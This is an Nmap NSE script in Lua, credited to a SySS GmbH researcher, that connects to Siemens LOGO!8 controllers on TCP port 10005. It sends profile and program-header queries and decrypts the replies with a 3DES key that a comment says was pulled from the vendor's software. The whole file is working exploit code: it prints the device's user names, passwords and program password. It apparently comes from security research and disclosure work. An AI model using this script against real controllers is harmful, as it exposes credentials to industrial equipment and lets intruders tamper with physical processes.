local nmap = require "nmap"
local nsedebug = require "nsedebug"
local openssl = require "openssl"
local shortport = require "shortport"
local stdnse = require "stdnse"
local table = require "table"

description = [[
Siemens LOGO!8 Information Gatherer (SLIG).
This script allows viewing the user profile setting which contains further access details and associated passwords
as well as the program password.
]]

author = "Manuel Stotz, SySS GmbH"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"auth", "safe"}

-- Port rule for devices running on TCP/10005
portrule = shortport.portnumber(10005)

-- Function to send query and receive response
local function send_receive(socket, query)
    -- Send query
    local sendstatus, senderr = socket:send(query)
    if(sendstatus == false) then return "Error Sending Packet" end
    -- Receive response
    local rcvstatus, response = socket:receive()
    if(rcvstatus == false) then return "Error Reading Packet" end
    return response
end

--  Action function to gather profile setting and program password
action = function(host, port)
    local sock = nmap.new_socket()
    local constatus, conerr = sock:connect(host, port)
    if not constatus then
        stdnse.debug1("Error establishing connection for %s - %s", host, conerr)
        return nil
    end

    -- 3DES key
    -- LOGO! Soft Comfort V8 Demo (https://www.automation.siemens.com/salesmaterial-as/software/logo/webdemo/Windows/VM/win64/setup.exe) SHA256: 2C9D1A1D808257F5361577235B9400F302936F87A959FF67665BA4B7B473841F 
    -- classes.jar -> DE.siemens.ad.logo.util -> LogoMath.keyForBinFile
    -- The proof is left as an exercise for the reader
    local key = "19, 41, 38, -116, 10, -34, 114, 65"

    -- GetProfile query
    local pkt_GetProfile = stdnse.fromhex("4bc001e0" .. "00000000" .. "00000000" .. "47657450726F66696C650000" .. "10270000")
    local response
    response  = send_receive(sock, pkt_GetProfile)
    if nmap.debugging() > 0 then nsedebug.print_hex(response) end
    if (string.byte(response:sub(1,1)) ~= 0x4b) and response:len() ~= 144 then return nil end
    -- Decrypt response
    response_decrypted = openssl.decrypt("DES-EDE3", string.rep(key, 3), nil, response:sub(17,-1))
    if nmap.debugging() > 0 then nsedebug.print_hex(response_decrypted)	end

    -- Add banner to result
    local result = {}
    result[#result + 1] = "Gathered Siemens LOGO!8 access details and passwords"

    -- Parse user profile and add to result
    local user_profile_length = 30
    for i=0,3 do
        local offset = i * user_profile_length
        result[#result + 1] = "User: " .. response_decrypted:sub(offset + 8, offset + 23):gsub('%W','')
        result[#result + 1] = "Password: " .. response_decrypted:sub(offset + 24, offset + 33):gsub('%W','')

        local enabled = string.byte(response_decrypted:sub(offset + 5, offset + 5))
        local enabled_status = ""
        if enabled == 0x00 then enabled_status = "False"
        elseif enabled == 0x01 then enabled_status = "True"
        else enabled_status = "Invalid"
        end
        result[#result + 1] = "Enabled: " .. enabled_status
    end

    -- GetPrgHead query
    local pkt_GetPrgHead = stdnse.fromhex("4bc001e0" .. "00000000" .. "00000000" .. "476574507267486561640000" .. "10270000")
    response  = send_receive(sock, pkt_GetPrgHead)
    if nmap.debugging() > 0 then nsedebug.print_hex(response) end
    if (string.byte(response:sub(1,1)) ~= 0x4b) and response:len() ~= 64 then return nil end
    -- Decrypt response
    response_decrypted = openssl.decrypt("DES-EDE3", string.rep(key, 3), nil, response:sub(17,-1))
    if nmap.debugging() > 0 then nsedebug.print_hex(response_decrypted) end

    -- Parse program header and add to result
    local protection_lvl = string.byte(response_decrypted:sub(4,4))
    local protection = ""
    if protection_lvl == 0x00 then protection = "None"
    elseif protection_lvl == 0x01 then protection = "Copy"
    elseif protection_lvl == 0x02 then protection = "Password"
    elseif protection_lvl == 0x03 then protection = "Password and copy"
    else protection = "Invalid"
    end
    result[#result + 1] = "Protection: " .. protection
    result[#result + 1] = "Program password: " .. response_decrypted:sub(33, 48):gsub('%W','')
    result[#result + 1] = "MMC serial: " .. response_decrypted:sub(17, 31)

    -- Return result
    return table.concat(result, "\n")
end
